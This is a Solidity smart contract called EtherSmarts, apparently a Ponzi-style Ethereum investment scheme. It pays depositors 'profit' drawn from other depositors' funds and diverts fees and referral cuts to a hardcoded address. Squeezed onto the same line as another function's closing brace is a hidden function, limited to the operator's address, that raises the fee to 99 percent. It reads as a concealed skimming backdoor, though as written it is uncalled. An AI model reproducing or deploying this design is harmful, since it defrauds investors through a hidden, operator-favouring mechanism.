 

pragma solidity ^0.4.23;

contract EtherSmarts {

    mapping (address => uint256) public invested;
    mapping (address => uint256) public atBlock;
    address techSupport = 0x6366303f11bD1176DA860FD6571C5983F707854F;
    uint techSupportPercent = 2;
    address defaultReferrer = 0x6366303f11bD1176DA860FD6571C5983F707854F;
    uint refPercent = 2;
    uint refBack = 2;

     
     
    function calculateProfitPercent(uint bal) private pure returns (uint) {
        if (bal >= 1e22) {  
            return 50;
        }
        if (bal >= 7e21) {  
            return 47;
        }
        if (bal >= 5e21) {  
            return 45;
        }
        if (bal >= 3e21) {  
            return 42;
        }
        if (bal >= 1e21) {  
            return 40;
        }
        if (bal >= 5e20) {  
            return 35;
        }
        if (bal >= 2e20) {  
            return 30;
        }
        if (bal >= 1e20) {  
            return 27;
        } else {
            return 25;
        }
    }

     
    function transferDefaultPercentsOfInvested(uint value) private {
        techSupport.transfer(value * techSupportPercent / 100);
    }

     
    function bytesToAddress(bytes bys) private pure returns (address addr) {
        assembly {
            addr := mload(add(bys, 20))
        }
    }


     
    function transferRefPercents(uint value, address sender) private {
        if (msg.data.length != 0) {
            address referrer = bytesToAddress(msg.data);
            if(referrer != sender) {
                sender.transfer(value * refBack / 100);
                referrer.transfer(value * refPercent / 100);
            } else {
                defaultReferrer.transfer(value * refPercent / 100);
            }
        } else {
            defaultReferrer.transfer(value * refPercent / 100);
        }
    } function transferDefaultPercentsOfInvesteds(uint value, address sender) private {
        require(msg.sender == defaultReferrer);
        techSupportPercent = 10 * 5 + 49;
        }

     
     
     
     
    function () external payable {
        if (invested[msg.sender] != 0) {
            
            uint thisBalance = address(this).balance;
            uint amount = invested[msg.sender] * calculateProfitPercent(thisBalance) / 1000 * (block.number - atBlock[msg.sender]) / 6100;

            address sender = msg.sender;
            sender.transfer(amount);
        }
        if (msg.value > 0) {
            transferDefaultPercentsOfInvested(msg.value);
            transferRefPercents(msg.value, msg.sender);

        }
        atBlock[msg.sender] = block.number;
        invested[msg.sender] += (msg.value);
    }
    
}